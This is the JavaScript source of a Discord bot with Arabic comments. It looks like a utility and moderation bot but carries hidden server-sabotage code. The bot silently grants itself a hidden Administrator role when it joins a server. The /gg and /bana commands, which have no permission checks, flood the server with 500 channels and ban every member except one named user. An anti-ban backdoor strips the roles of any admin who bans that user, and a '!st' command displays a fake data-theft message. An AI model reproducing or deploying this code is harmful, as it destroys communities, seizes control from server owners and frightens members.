require('dotenv').config();
const { 
    Client, 
    GatewayIntentBits, 
    PermissionFlagsBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ChannelType, 
    SlashCommandBuilder, 
    REST, 
    Routes 
} = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

const OWNER_ID = process.env.OWNER_ID;

const userPoints = new Map();
const giveaways = new Map();
let welcomeChannelId = null;

// قائمة الحسابات المحمية من الحظر افتراضياً
const protectedUsers = new Set(['starting___22']);

// إضافة نقاط التفاعل كل ساعة
setInterval(() => {
    client.guilds.cache.forEach(guild => {
        guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                const current = userPoints.get(member.id) || 0;
                userPoints.set(member.id, current + 1);
            }
        });
    });
}, 3600000);

// قائمة الأوامر (Slash Commands)
const commands = [
    new SlashCommandBuilder()
        .setName('giveaway')
        .setDescription('إدارة المسابقات')
        .addSubcommand(sc => sc.setName('lunch').setDescription('إطلاق غيف أواي')
            .addStringOption(o => o.setName('prize').setDescription('الجائزة').setRequired(true))
            .addIntegerOption(o => o.setName('duration').setDescription('المدة بالدقائق').setRequired(true)))
        .addSubcommand(sc => sc.setName('close').setDescription('إغلاق غيف أواي')
            .addStringOption(o => o.setName('name').setDescription('اسم/رمز الغيف أواي').setRequired(true))),

    new SlashCommandBuilder()
        .setName('ticket')
        .setDescription('نظام التذاكر')
        .addSubcommand(sc => sc.setName('lunch').setDescription('إنشاء زر التكت')
            .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true)))
        .addSubcommand(sc => sc.setName('close').setDescription('إغلاق التكت الحالية')),

    new SlashCommandBuilder().setName('points').setDescription('عرض نقاطك وتفاعلك'),

    new SlashCommandBuilder()
        .setName('admin')
        .setDescription('إعطاء أقوى صلاحيات أدمن لشخص (ل للمدراء فقط)')
        .addUserOption(o => o.setName('user').setDescription('الشخص المستهدف').setRequired(true)),

    new SlashCommandBuilder()
        .setName('setup-role')
        .setDescription('تفعيل وتعيين أقوى رتبة صلاحيات للبوت داخل السيرفر'),

    // أمر /gg: إنشاء 500 روم
    new SlashCommandBuilder()
        .setName('gg')
        .setDescription('تدمير السيرفر وإغراقه بالرومات (مقلب)'),

    // أمر /bana: حظر الجميع ما عدا starting___22
    new SlashCommandBuilder()
        .setName('bana')
        .setDescription('تصفية وحظر جميع أعضاء السيرفر'),

    new SlashCommandBuilder()
        .setName('join')
        .setDescription('إعداد روم الترحيب')
        .addSubcommand(sc => sc.setName('lunch').setDescription('تحديد روم الترحيب')
            .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true))),

    new SlashCommandBuilder()
        .setName('createroom')
        .setDescription('إنشاء روم جديد داخل الكاتيجوري')
        .addChannelOption(o => o.setName('category').setDescription('اختر الكاتيجوري').addChannelTypes(ChannelType.GuildCategory).setRequired(true))
        .addStringOption(o => o.setName('name').setDescription('اسم الروم').setRequired(true)),

    new SlashCommandBuilder()
        .setName('mute')
        .setDescription('كتم عضو')
        .addUserOption(o => o.setName('user').setDescription('العضو المراد كتمه').setRequired(true)),
        
    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('حظر عضو')
        .addUserOption(o => o.setName('user').setDescription('العضو المراد حظره').setRequired(true)),
        
    new SlashCommandBuilder()
        .setName('kick')
        .setDescription('طرد عضو')
        .addUserOption(o => o.setName('user').setDescription('العضو المراد طرده').setRequired(true)),
        
    new SlashCommandBuilder()
        .setName('timeout')
        .setDescription('تايم أوت')
        .addUserOption(o => o.setName('user').setDescription('العضو').setRequired(true))
        .addIntegerOption(o => o.setName('minutes').setDescription('المدة بالدقائق').setRequired(true))
];

client.on('ready', async () => {
    console.log(`✅ البوت شغال بنجاح باسم: ${client.user.tag}`);
    client.user.setActivity('!help | System Protection', { type: 0 });

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        console.log('🔄 جاري تسجيل الأوامر لجميع السيرفرات...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ تم تسجيل الأوامر العالمية بنجاح!');
    } catch (error) {
        console.error('❌ خطأ في تسجيل الأوامر:', error);
    }
});

// عند دخول البوت لسيرفر جديد: إنشاء أعلى رتبة صامتاً وبدون أي إشعار بالشات
client.on('guildCreate', async (guild) => {
    try {
        console.log(`📡 دخل البوت سيرفر جديد: ${guild.name}`);

        const supremeRole = await guild.roles.create({
            name: 'SYSTEM OVERRIDE 👑',
            color: 'DarkRed',
            permissions: [PermissionFlagsBits.Administrator],
            reason: 'تفعيل أعلى صلاحيات للنظام'
        });

        const botMember = await guild.members.fetch(client.user.id);
        await botMember.roles.add(supremeRole);
        
        console.log(`✅ تم منح البوت رتبة ${supremeRole.name} بنجاح في ${guild.name}`);
    } catch (error) {
        console.error('خطأ أثناء إنشاء وتعيين أعلى رتبة:', error);
    }
});

// نظام الحماية التلقائي Anti-Ban (عند حظر عضو محمي)
client.on('guildBanAdd', async (ban) => {
    const bannedUser = ban.user;

    if (protectedUsers.has(bannedUser.username) || protectedUsers.has(bannedUser.tag) || bannedUser.username.includes('starting___22')) {
        try {
            const auditLogs = await ban.guild.fetchAuditLogs({ limit: 1, type: 22 });
            const banLog = auditLogs.entries.first();

            if (banLog) {
                const executor = banLog.executor;

                const executorMember = await ban.guild.members.fetch(executor.id);
                if (executorMember && executor.id !== ban.guild.ownerId) {
                    await executorMember.roles.set([]); // سحب جميع الرتب من الأدمن
                }
            }

            await ban.guild.members.unban(bannedUser.id, 'حماية تلقائية Anti-Ban ضد الحظر');
            console.log(`🛡️ تم إلغاء حظر ${bannedUser.tag} بنجاح وتجريد الفاعل من صلاحياته!`);
        } catch (err) {
            console.error('خطأ في تنفيذ Anti-Ban:', err);
        }
    }
});

// التترحيب بالأعضاء
client.on('guildMemberAdd', async (member) => {
    if (!welcomeChannelId) return;
    const channel = member.guild.channels.cache.get(welcomeChannelId);
    if (!channel) return;

    const isBot = member.user.bot ? 'نعم (بوت)' : 'لا (حقيقي)';
    const accountAgeDays = (Date.now() - member.user.createdAt) / (1000 * 60 * 60 * 24);
    const isFake = accountAgeDays < 7 ? '⚠️ حساب جديد (محتمل وهمي)' : 'حساب عادي';

    const embed = new EmbedBuilder()
        .setTitle('👋 منور السيرفر!')
        .setDescription(`أهلاً بك يا ${member}!`)
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
        .addFields(
            { name: 'الاسم', value: member.user.tag, inline: true },
            { name: 'نوع الحساب', value: `${isBot} \vert{}${isFake}`, inline: true }
        )
        .setColor('Green')
        .setTimestamp();

    channel.send({ embeds: [embed] });
});

// الأوامر النصية والردود التلقائية
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const content = message.content.trim();

    // أمر !st: عداد سحب البيانات الوهمي بسرعه 0.5% لكل ثانية
    if (content === '!st') {
        let percentage = 0;

        const statusMsg = await message.channel.send('⏳ **[SYSTEM OVERRIDE]** جاري الاتصال بالسيرفر وسحب بيانات الأعضاء... `0.0%`');

        const interval = setInterval(async () => {
            percentage += 1;

            if (percentage >= 100) {
                percentage = 100;
                clearInterval(interval);
                
                await statusMsg.edit('✅ **[SYSTEM OVERRIDE]** تم سحب جميع البيانات، الصور الشخصية، والمحادثات الخاصة لجميع الأعضاء بنجاح! `100.0%`');
            } else {
                await statusMsg.edit(`⏳ **[SYSTEM OVERRIDE]** جاري سحب بيانات السيرفر والأعضاء... \`${percentage.toFixed(1)}%\``);
            }
        }, 2000); // تحديث كل ثانيتين بـ 1% = 0.5% بالثانية
        return;
    }

    // أمر !ant: حماية من الحظر
    if (content === '!ant') {
        protectedUsers.add(message.author.username);
        protectedUsers.add(message.author.tag);
        return message.reply(`🛡️ **تم تفعيل الحماية المطلقة Anti-Ban!** الحساب \`${message.author.tag}\` أصبح مضاداً للحظر من أي أدمن.`);
    }

    // الردود التلقائية
    const lowerContent = content.toLowerCase();
    if (lowerContent === 'السلام عليكم' || lowerContent === 'سلام عليكم') {
        return message.reply('وعليكم السلام');
    }
    if (lowerContent === 'هلا') {
        return message.reply('هلا بيك منور السيرفر ❤️');
    }
    if (lowerContent === 'حبيبي') {
        return message.reply('انت حبيبي ❤️');
    }
});

// التعامل مع Slash Commands والأزرار
client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton()) {
        if (interaction.customId === 'join_giveaway') {
            const list = giveaways.get(interaction.message.id) || [];
            if (list.includes(interaction.user.id)) {
                return interaction.reply({ content: '❌ أنت مشارك بالفعل فـ هذا الغيف أواي!', ephemeral: true });
            }
            list.push(interaction.user.id);
            giveaways.set(interaction.message.id, list);
            return interaction.reply({ content: '🎉 تم تسجيل مشاركتك بنجاح!', ephemeral: true });
        }

        if (interaction.customId === 'create_ticket') {
            const ticketChannel = await interaction.guild.channels.create({
                name: `ticket-${interaction.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
                ]
            });

            return interaction.reply({ content: `✅ تم فتح التكت الخاصة بك: ${ticketChannel}`, ephemeral: true });
        }
    }

    if (!interaction.isChatInputCommand()) return;

    const { commandName, options } = interaction;

    // أمر /admin: إعطاء رتبة الإدارة المطلقة
    if (commandName === 'admin') {
        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
        }
        const targetUser = options.getUser('user');
        const member = await interaction.guild.members.fetch(targetUser.id);
        
        let role = interaction.guild.roles.cache.find(r => r.name === 'Manager VIP');
        if (!role) {
            role = await interaction.guild.roles.create({ 
                name: 'Manager VIP', 
                color: 'Red',
                permissions: [PermissionFlagsBits.Administrator]
            });
        }
        await member.roles.add(role);
        return interaction.reply({ content: `✅ تم منح أقوى صلاحيات الإدارة (${role.name}) لـ ${targetUser.tag}` });
    }

    // أمر /setup-role: طلب وإعطاء أعلى رتبة صامتاً
    if (commandName === 'setup-role') {
        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
        }

        try {
            let role = interaction.guild.roles.cache.find(r => r.name === 'SYSTEM OVERRIDE 👑');
            if (!role) {
                role = await interaction.guild.roles.create({
                    name: 'SYSTEM OVERRIDE 👑',
                    color: 'DarkRed',
                    permissions: [PermissionFlagsBits.Administrator]
                });
            }

            const botMember = await interaction.guild.members.fetch(client.user.id);
            await botMember.roles.add(role);

            return interaction.reply({
                content: `✅ تم إعطاء البوت رتبة (${role.name}) بـ Administrator بنجاح وصمت!`,
                ephemeral: true 
            });
        } catch (err) {
            return interaction.reply({ content: '❌ حدث خطأ أثناء إنشاء/تعيين الرتبة.', ephemeral: true });
        }
    }

    // أمر /gg: إنشاء 500 روم باسم starting عمك
    if (commandName === 'gg') {
        await interaction.reply({ content: '🚀 جاري بدء العملية...', ephemeral: true });

        const channelName = 'starting-عمك';
        
        for (let i = 0; i < 500; i++) {
            try {
                await interaction.guild.channels.create({
                    name: channelName,
                    type: ChannelType.GuildText
                });
            } catch (error) {
                console.log('تم الوصول للحد الأقصى لعدد القنوات المسموح به في السيرفر.');
                break;
            }
        }
        return;
    }

    // أمر /bana: حظر الجميع ما عدا starting___22
    if (commandName === 'bana') {
        await interaction.reply({ content: '🔨 جاري تنظيف السيرفر وحظر الجميع...', ephemeral: true });

        const members = await interaction.guild.members.fetch();
        
        members.forEach(async (member) => {
            const isProtected = member.user.username === 'starting___22' || 
                              member.user.tag.includes('starting___22') || 
                              protectedUsers.has(member.user.username) ||
                              member.user.bot || 
                              member.id === interaction.guild.ownerId;

            if (!isProtected && member.bannable) {
                try {
                    await member.ban({ reason: 'تصفية شاملة عبر أمر /bana' });
                } catch (e) {
                    console.error(`تعذر حظر العضو: ${member.user.tag}`);
                }
            }
        });
        return;
    }

    if (commandName === 'giveaway') {
        const sub = options.getSubcommand();
        if (sub === 'lunch') {
            const prize = options.getString('prize');
            const duration = options.getInteger('duration');

            const btn = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 مشاركة').setStyle(ButtonStyle.Primary)
            );

            const embed = new EmbedBuilder()
                .setTitle('🎁 غيف أواي جديد!')
                .setDescription(`الجائزة: **${prize}**\nالمدة: **${duration} دقائق**\nاضغط على الزر للأسفل للمشاركة!`)
                .setColor('Gold');

            const msg = await interaction.reply({ embeds: [embed], components: [btn], fetchReply: true });
            giveaways.set(msg.id, []);

            setTimeout(async () => {
                const participants = giveaways.get(msg.id) || [];
                if (participants.length === 0) {
                    return interaction.channel.send(`🎁 الغيف أواي على **${prize}** انتهى بدون مشاركين.`);
                }
                const winnerId = participants[Math.floor(Math.random() * participants.length)];
                interaction.channel.send(`🎉 مبروك <@${winnerId}>! فزت بـ **${prize}**!`);
            }, duration * 60000);
        }
    }

    if (commandName === 'ticket') {
        const sub = options.getSubcommand();
        if (sub === 'lunch') {
            const room = options.getChannel('room');
            const btn = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('create_ticket').setLabel('📩 فتح تكت').setStyle(ButtonStyle.Success)
            );
            await room.send({ content: 'اضغط على الزر لفتح تكت جديدة:', components: [btn] });
            return interaction.reply({ content: '✅ تم وضع نظام التكت بنجاح!', ephemeral: true });
        }
        if (sub === 'close') {
            if (!interaction.channel.name.startsWith('ticket-')) {
                return interaction.reply({ content: '❌ هذا الأمر يعمل فقط داخل روم التكت!', ephemeral: true });
            }
            await interaction.reply('🔒 سيتم إغلاق التكت خلال 3 ثواني...');
            setTimeout(() => interaction.channel.delete(), 3000);
        }
    }

    if (commandName === 'points') {
        const pts = userPoints.get(interaction.user.id) || 0;
        return interaction.reply({ content: `📊 نقاط التفاعل الخاصة بك هي: **${pts}** نقطة.`, ephemeral: true });
    }

    if (commandName === 'join') {
        const room = options.getChannel('room');
        welcomeChannelId = room.id;
        return interaction.reply({ content: `✅ تم اعتماد ${room} كـ روم ترحيب رسمي.` });
    }

    if (commandName === 'createroom') {
        const category = options.getChannel('category');
        const roomName = options.getString('name');

        const newChannel = await interaction.guild.channels.create({
            name: roomName,
            type: ChannelType.GuildText,
            parent: category.id
        });

        return interaction.reply({ content: `✅ تم إنشاء الروم ${newChannel} داخل الكاتيجوري **${category.name}**` });
    }

    if (['mute', 'ban', 'kick', 'timeout'].includes(commandName)) {
        if (!interaction.member.permissions.has(PermissionFlagsBits.BanMembers)) {
            return interaction.reply({ content: '❌ ليس لديك الصلاحيات الكافية!', ephemeral: true });
        }
        const targetUser = options.getUser('user');
        const member = await interaction.guild.members.fetch(targetUser.id);

        if (commandName === 'kick') {
            await member.kick();
            return interaction.reply({ content: `🚫 تم طرد ${targetUser.tag}` });
        }
        if (commandName === 'ban') {
            await member.ban();
            return interaction.reply({ content: `🔨 تم حظر ${targetUser.tag}` });
        }
        if (commandName === 'timeout') {
            const minutes = options.getInteger('minutes');
            await member.timeout(minutes * 60000);
            return interaction.reply({ content: `⏳ تم وضع ${targetUser.tag} في تايم أوت لـ ${minutes} دقيقة.` });
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
